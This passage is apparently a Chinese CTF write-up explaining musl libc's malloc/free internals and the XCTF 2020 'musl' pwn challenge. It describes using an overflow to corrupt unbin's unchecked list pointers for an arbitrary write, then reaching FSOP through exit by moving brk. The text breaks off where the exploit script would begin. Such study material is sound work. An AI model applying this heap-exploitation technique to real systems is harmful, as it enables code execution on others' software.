class="comment">// *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;</span></span><br><span class="line">    <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 n 到达 MMAP_THRESHOLD (0x38000)，使用 mmap chunk</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">        [...]</span><br><span class="line">        <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 计算 n 对应的 bin 下标 i</span></span><br><span class="line">    i = bin_index_up(n);</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 3. 查找 binmap</span></span><br><span class="line">        <span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        <span class="comment">// 若所有的可用 bin 均为空，调用 expand_heap 函数延展堆空间，生成新的 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">            c = expand_heap(n);</span><br><span class="line">            [...]</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. 获取大小最接近 n 的可用 bin 下标 j</span></span><br><span class="line">        j = first_set(mask);</span><br><span class="line">        lock_bin(j);</span><br><span class="line">        c = mal.bins[j].head; <span class="comment">// c 是 bin j 链表首部的 chunk</span></span><br><span class="line">        <span class="comment">// 5. 若符合条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c</span></span><br><span class="line">        <span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">            unlock_bin(j);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        unlock_bin(j);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 回收 c 中大小超过 n 的部分</span></span><br><span class="line">    <span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    trim(c, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概步骤就是：</p><ol><li><p>调整n，增加头部的长度然后对齐32位</p></li><li><p>如果n&gt;MMAP_THRESHOLD，则使用mmap创建一块大小为n的内存返回</p></li><li><p>如果n&lt;=MMAP_THRESHOLD，计算n对应的bin的i，查找binmap</p><p>​    如果所有可用bin都为空，那么就扩展堆空间，生存一个新的chunk</p><p>​    如果存在非空的bin，则大小最接近n的bin，将bin首部的chunk返回</p><p>​        如果符号pretrime条件，使用pretrime分割</p><p>​        否则使用unbin从链表中取出</p><p>​    最后对chunk进行trim，返回给用户</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 若 bin 只有一个 chunk，将 bin 设为空 bin</span></span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">// 取出链表中的 chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// 设置 INUSE 标志位</span></span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其实就是取出chunk的一个操作，可以看到取出的过程中并没有检测chunk指针的合法性，这也就造成了安全隐患</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pretrim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> n1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件 1: bin j 下标大于 40</span></span><br><span class="line">    <span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 条件 2: bin j 与 i 相隔 3 个 bin 或以上，</span></span><br><span class="line">    <span class="comment">// 或者 j 等于 63 且 split 的大小大于 MMAP_THRESHOLD</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        n1 = CHUNK_SIZE(self);</span><br><span class="line">        <span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        n1 = CHUNK_SIZE(self);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 条件 3: split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin</span></span><br><span class="line">    <span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切割出一块大小为 n 的 chunk</span></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;prev = self-&gt;prev;</span><br><span class="line">    split-&gt;next = self-&gt;next;</span><br><span class="line">    split-&gt;prev-&gt;next = split;</span><br><span class="line">    split-&gt;next-&gt;prev = split;</span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1-n;</span><br><span class="line">    next-&gt;psize = n1-n;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pretrim的作用是切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件时，pretrim从 bin 链表首部 chunk 切割出一块大小刚好符合需求的小 chunk，然后将小 chunk 分配给用户，链表首部 chunk 的位置保持不变。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件：self 的大小 n1 多于 n DONTCARE (0x10) 字节</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 self 的大小切割为 n，剩余部分成为新的 chunk split</span></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">    next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 split 释放到 bin</span></span><br><span class="line">    __bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc 的最后一步是trim，主要作用是回收 chunk 超过需求大小的部分。trim将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或者 double free</span></span><br><span class="line">    <span class="comment">// #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line">    <span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">        unmap_chunk(self);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        __bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unmap_chunk</span><span class="params">(struct chunk *self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> extra = self-&gt;psize;</span><br><span class="line">    <span class="keyword">char</span> *base = (<span class="keyword">char</span> *)self - extra;</span><br><span class="line">    <span class="keyword">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">    <span class="comment">// 若 prev size 设置了 INUSE 标志位，视为 double free，crash</span></span><br><span class="line">    <span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    __munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free 先对 chunk 进行 mmap / double free 检查。如果 chunk 的csize字段没有设置INUSE标志位，进入unmap_chunk函数检查psize字段。如果psize字段设置了INUSE标志位，视为 double free，crash；否则视为 mmap chunk，调用__munmap函数释放。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">    <span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">    <span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小</span></span><br><span class="line">    final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若下一个 chunk 的 psize 不等于 self 的 csize，则 crash</span></span><br><span class="line">    <span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">    <span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 检查 self 前后是否有空闲 chunk</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">// 去除 INUSE 标志位</span></span><br><span class="line">            self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">            next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">            <span class="comment">// 计算 final_size 对应的 bin 下标 i</span></span><br><span class="line">            i = bin_index(final_size);</span><br><span class="line">            lock_bin(i);</span><br><span class="line">            lock(mal.free_lock);</span><br><span class="line">            <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">                <span class="keyword">break</span>;  <span class="comment">// 退出循环</span></span><br><span class="line">            unlock(mal.free_lock);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向前合并空闲 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (alloc_rev(self)) &#123;  <span class="comment">// 从 bin 链表取出待合并的空闲 chunk</span></span><br><span class="line">            self = PREV_CHUNK(self);</span><br><span class="line">            size = CHUNK_SIZE(self);</span><br><span class="line">            final_size += size;</span><br><span class="line">            <span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">                reclaim = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向后合并空闲 chunk</span></span><br><span class="line">        <span class="keyword">if</span> (alloc_fwd(next)) &#123;  <span class="comment">// 从 bin 链表取出待合并的空闲 chunk</span></span><br><span class="line">            size = CHUNK_SIZE(next);</span><br><span class="line">            final_size += size;</span><br><span class="line">            <span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">                reclaim = <span class="number">1</span>;</span><br><span class="line">            next = NEXT_CHUNK(next);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 在 binmap 中，将 bin i 设为非空 bin</span></span><br><span class="line">    <span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">        a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">    self-&gt;csize = final_size;</span><br><span class="line">    next-&gt;psize = final_size;</span><br><span class="line">    unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将 self 加入到 bin i 链表的尾部</span></span><br><span class="line">    self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">    self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">    self-&gt;next-&gt;prev = self;</span><br><span class="line">    self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">    <span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">        [...]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__bin_chunk函数的作用是将 chunk 插入到 bin 链表中。首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。</p><p>然后在musl当中的堆管理为了减少内存的使用会直接将libc和程序当中的空闲的内存当作堆内存，而glibc的堆地址一般都是位于内存中的动态内存区域。</p><h2 id="XCTF-2020-PWN-musl"><a href="#XCTF-2020-PWN-musl" class="headerlink" title="XCTF_2020_PWN_musl"></a>XCTF_2020_PWN_musl</h2><p><img src="/images/image-20220427153926579.png" alt="image-20220427153926579"></p><p>可以看到这里确实是直接在libc和process上面有堆的地址。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是很经典的菜单题，并且在create函数里面有一处只能运行一次的0x50的溢出，而且题目只有一处使用exit退出程序，然后show函数也只有一次。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>其实利用思路就很简单了，存在溢出，unbin又有如此大的安全隐患，所以就是通过溢出修改掉next指针和prev指针从而实现任意地址写，造成FSOP</p><p>这里说一下怎么造成的FSOP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__funcs_on_exit();</span><br><span class="line">__libc_exit_fini();</span><br><span class="line">__stdio_exit();</span><br><span class="line">_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close_file</span><span class="params">(FILE *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">close_file(__stdin_used);</span><br><span class="line">close_file(__stdout_used);</span><br><span class="line">close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最后是有机会调用到file的内部函数指针的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *rpos, *rend;</span><br><span class="line"><span class="keyword">int</span> (*close)(FILE *);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *wend, *wpos;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mustbezero_1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *wbase;</span><br><span class="line"><span class="keyword">size_t</span> (*read)(FILE *, <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">size_t</span> (*write)(FILE *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">off_t</span> (*seek)(FILE *, <span class="keyword">off_t</span>, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line">FILE *prev, *next;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> pipe_pid;</span><br><span class="line"><span class="keyword">long</span> lockcount;</span><br><span class="line"><span class="keyword">int</span> mode;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> lock;</span><br><span class="line"><span class="keyword">int</span> lbf;</span><br><span class="line"><span class="keyword">void</span> *cookie;</span><br><span class="line"><span class="keyword">off_t</span> off;</span><br><span class="line"><span class="keyword">char</span> *getln_buf;</span><br><span class="line"><span class="keyword">void</span> *mustbezero_2;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shend;</span><br><span class="line"><span class="keyword">off_t</span> shlim, shcnt;</span><br><span class="line">FILE *prev_locked, *next_locked;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们需要利用exit来执行FSOP，不过难点就是怎么运行到exit，因为需要malloc返回一个0xdeadbeef，在上面可以看到，如果所有的bin都为空，此时malloc就会调用expand_heap来扩展堆，本质还是调用了__expand_heap函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__expand_heap(<span class="keyword">size_t</span> *pn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uintptr_t</span> brk;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> mmap_step;</span><br><span class="line"><span class="keyword">size_t</span> n = *pn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &gt; SIZE_MAX/<span class="number">2</span> - PAGE_SIZE) &#123;</span><br><span class="line">errno = ENOMEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">n += -n &amp; PAGE_SIZE<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!brk) &#123;</span><br><span class="line">brk = __syscall(SYS_brk, <span class="number">0</span>);</span><br><span class="line">brk += -brk &amp; PAGE_SIZE<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt; SIZE_MAX-brk &amp;&amp; !traverses_stack_p(brk, brk+n)</span><br><span class="line">    &amp;&amp; __syscall(SYS_brk, brk+n)==brk+n) &#123;</span><br><span class="line">*pn = n;</span><br><span class="line">brk += n;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)(brk-n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> min = (<span class="keyword">size_t</span>)PAGE_SIZE &lt;&lt; mmap_step/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (n &lt; min) n = min;</span><br><span class="line"><span class="keyword">void</span> *area = __mmap(<span class="number">0</span>, n, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (area == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">*pn = n;</span><br><span class="line">mmap_step++;</span><br><span class="line"><span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在__expand_heap函数中，brk是指向数据段末尾位置的指针。__expand_heap函数调用 brk 系统调用__syscall(SYS_brk, brk+n)，将数据段末尾向后延展n字节，然后延展部分返回给malloc作为新的 chunk 分配给用户</p><p>若程序不开启 PIE，数据段的地址长度为 24 bit（0~0x2000000），内存位置与0xBADBEEF比较接近。若将brk指针修改为0xBADBEEF - n，brk 系统调用就会把数据段延展至0xBADBEEF，使其成为可访问的内存地址。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 